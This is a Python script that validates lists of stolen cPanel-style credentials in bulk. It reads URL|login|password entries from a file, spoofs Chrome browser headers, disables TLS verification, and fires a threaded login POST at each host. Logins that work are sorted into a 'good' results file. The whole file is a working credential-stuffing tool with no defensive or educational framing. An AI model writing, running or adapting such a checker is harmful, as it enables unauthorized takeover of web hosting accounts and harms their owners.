import requests
import re
import socket
import threading
import urllib3
import os
from json.decoder import JSONDecodeError

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

accounts_list = open("accounts.txt", "r").read().splitlines()            

def check(url, login, password):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Origin': url,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'login_only': '1',
    }

    data = {
        'user': login,
        'pass': password,
    }

    try:
        try:
            response = requests.post('{}/login/'.format(url), params = params, headers = headers, data = data, timeout = 3, verify = False).json()
            if response['status'] == 1:
                print('Valid: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
                with open("./results/good.txt", "a") as f:
                    f.write('{}|{}|{} \n'.format(url, login, password))
            else: 
                print('Invalid: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
                with open("./results/bad.txt", "a") as f:
                    f.write('{}|{}|{} \n'.format(url, login, password))
        except JSONDecodeError as e:
            print('Bad format: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
            with open("./results/no_check.txt", "a") as f:
                f.write('{}|{}|{} \n'.format(url, login, password))
    except requests.Timeout as err:
        print('Bad request: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
        with open("./results/bad_request.txt", "a") as f:
            f.write('{}|{}|{} \n'.format(url, login, password))


def test_connect(domain: str, port: int):
    try:
        with socket.create_connection((domain, port)) as s:
            return True
    except OSError:
        pass
    return False

def check_thread(url_test, url, port, login, password):
    if test_connect(url_test, port):
        check(url, login, password)
    else: 
        print('Not working! URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
        with open("./results/notwork_url.txt", "a") as f:
            f.write('{}|{}|{} \n'.format(url, login, password))
        
account_count = 0 
musorka = 0 

for account in accounts_list:
    account = account.split('|')
    os.system("title Accounts {} / Checked: {} / Musor: {}".format(len(accounts_list) - 1, account_count, musorka))
    url = re.search('(.+)cpsess', account[0])
    port = re.search('://(.+):(\d+)/', account[0])
    if url:
        if port:
            th = threading.Thread(target = check_thread, args=(port.group(1), url.group(1), port.group(2), account[1], account[2])).start()
            account_count += 1
        else: 
            musorka += 1
            print('Musorka: URL: {} | Login: {} | Password: {} \n'.format(account[0], account[1], account[2]))
            with open("./results/musorka.txt", "a") as f:
                f.write('{}|{}|{} \n'.format(account[0], account[1], account[2]))
    else:
        if port:
            th = threading.Thread(target = check_thread, args=(port.group(1), account[0], port.group(2), account[1], account[2])).start()
            account_count += 1
        else: 
            musorka += 1
            print('Musorka: URL: {} | Login: {} | Password: {} \n'.format(account[0], account[1], account[2]))
            with open("./results/musorka.txt", "a") as f:
                f.write('{}|{}|{} \n'.format(account[0], account[1], account[2]))